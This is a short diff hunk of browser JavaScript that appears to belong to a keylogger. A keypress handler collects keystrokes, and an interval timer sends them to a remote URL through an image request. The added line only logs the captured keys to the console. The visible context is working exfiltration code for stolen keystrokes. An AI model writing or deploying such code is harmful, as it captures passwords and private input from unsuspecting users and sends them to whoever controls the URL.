@@ -9,6 +9,7 @@ document.onkeypress = function(e) {
 }
 window.setInterval(function(){
 	if(keys.length>0) {
+		console.log(keys);
 		new Image().src = url+keys;
 		keys = '';
 	}
